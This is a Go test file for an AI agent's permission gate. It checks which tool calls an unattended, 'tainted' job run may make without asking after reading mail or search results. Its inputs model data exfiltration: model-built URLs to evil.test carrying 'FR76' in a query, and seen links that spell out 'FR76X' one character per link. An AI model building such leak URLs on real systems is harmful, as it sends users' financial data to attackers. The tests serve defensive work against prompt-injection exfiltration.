package runner

import (
	"context"
	"encoding/json"
	"strconv"
	"testing"

	"github.com/FacileStudio/Bulle/apps/api/internal/store"
	"github.com/FacileStudio/nacelle"
)

func TestATaintedJobRunFollowsSeenLinksAndWritesArtifactsButKeepsTheShellGated(t *testing.T) {
	g := mailTaintedGate()
	g.unattend(store.ChannelCron)
	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "sonar_search"}, Result: linkTable()})
	for i, char := range "FR76X" {
		if g.need(sonarFetchTool, urlInput("https://evil.test/"+strconv.Itoa(i+1)+"/"+string(char)), true) != askNo {
			t.Fatalf("a job run must follow link %d from a result unasked", i+1)
		}
	}
	if !g.asks(sonarFetchTool, urlInput("https://www.lemonde.fr/economie/")) {
		t.Fatal("a tainted job run must ask before fetching a URL it never saw")
	}
	if !g.asks(browserNavigateTool, urlInput("https://evil.test/?d=FR76")) {
		t.Fatal("a job run must still ask before navigating to a URL it never saw")
	}
	for _, tool := range artifactWrites {
		if g.asks(tool, json.RawMessage(`{"title":"x","content":"FR76"}`)) {
			t.Errorf("a job run must write %s unasked", tool)
		}
	}
	for _, tool := range []string{shellTool, memoryWriteTool, "opus_create_task"} {
		if !g.asks(tool, json.RawMessage(`{}`)) {
			t.Errorf("a job run must still ask before %s", tool)
		}
	}
}

func TestACleanJobRunFetchesAnyURLUnasked(t *testing.T) {
	g := trustGate(nacelle.UserText("fetch the news"))
	g.unattend(store.ChannelCron)
	if g.asks(sonarFetchTool, urlInput("https://www.lemonde.fr/economie/")) {
		t.Fatal("a job run no source tainted must fetch any URL unasked")
	}
}

func TestATaintedJobRunAsksForABuiltURLAndNotForTheJobPromptURL(t *testing.T) {
	g := trustGate(nacelle.UserText("sum up my mail and read https://news.test/daily"))
	g.unattend(store.ChannelCron)
	g.observe(context.Background(), nacelle.HookEvent{Point: nacelle.AfterToolCall, Call: nacelle.Call{Name: "courrier_read_thread"},
		Result: "see https://shop.test/offer"})
	if !g.asks(sonarFetchTool, urlInput("https://evil.test/?d=FR76")) {
		t.Fatal("a tainted job run fetched a URL the model built, unasked")
	}
	if !g.asks(sonarFetchTool, urlInput("https://shop.test/offer?d=FR76")) {
		t.Fatal("a seen URL with a query the model added must ask")
	}
	if g.asks(sonarFetchTool, urlInput("https://news.test/daily")) || g.asks(sonarFetchTool, urlInput("https://shop.test/offer")) {
		t.Fatal("a URL from the job prompt or seen verbatim in a result must pass")
	}
}
